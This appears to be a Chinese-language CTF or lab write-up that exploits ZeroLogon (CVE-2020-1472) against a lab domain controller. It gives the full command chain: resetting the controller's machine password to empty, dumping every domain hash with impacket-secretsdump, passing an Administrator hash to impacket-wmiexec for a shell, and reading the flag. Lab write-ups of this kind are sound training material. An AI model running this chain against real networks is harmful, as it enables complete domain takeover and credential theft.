# **ZeroLogon**

搜索一下这个**ZeroLogon**，大概了解一下就是利用CVE-2020-1472

（在不持有任何有效凭据的情况下直接将域控器的机器账户密码重置为空，然后以域控的身份导出域内所有密码哈希，最终接管整个域）![image-20261114215329514](./assets/posts/Zerologon.assets/image-20261114215329514.png)

## 准备工作

ZeroLogon的攻击对象的机器账户（格式为计算机名$ ）

写脚本的话要知道这个名字而不是IP域名

### 获取域控的计算机名和域名

 nxc smb 192.168.111.100![image-20261114220311675](./assets/posts/Zerologon.assets/image-20261114220311675.png)

得到核心信息：

- **计算机名 (NetBIOS Name)**：`MASTERPC` 
- **域名 (Domain)**：`myd.com`
- **系统版本**：Windows Server 2016 Datacenter
- **目标 IP**：`192.168.111.100`

装个CVE-2020-1472

装完之后运行漏洞检测脚本

```
python3 zerologon_tester.py MASTERPC 192.168.111.100
```

因为脚本没下载成功换一个思路![image-20261114224915419](./assets/posts/Zerologon.assets/image-20261114224915419.png)

置空域控密码

```
python3 cve-2020-1472-exploit.py MASTERPC 192.168.111.100
```

DCSync导出哈希

```
impacket-secretsdump -no-pass -just-dc 'myd.com/MASTERPC$@192.168.111.100'
```

得到![image-20261114225614955](./assets/posts/Zerologon.assets/image-20261114225614955.png)

哈希传递获取shell

执行：

```
impacket-wmiexec -hashes :ec0df45863a3751d56ba6df1e72f7218 myd.com/Administrator@192.168.111.100
```

执行成功，终端变成C:\    ![image-20261114230232550](./assets/posts/Zerologon.assets/image-20261114230232550.png)

找flag

```
dir C:\flag.txt /s /b
type C:\flag.txt
```

得到flag![image-20261114230519144](./assets/posts/Zerologon.assets/image-20261114230519144.png)
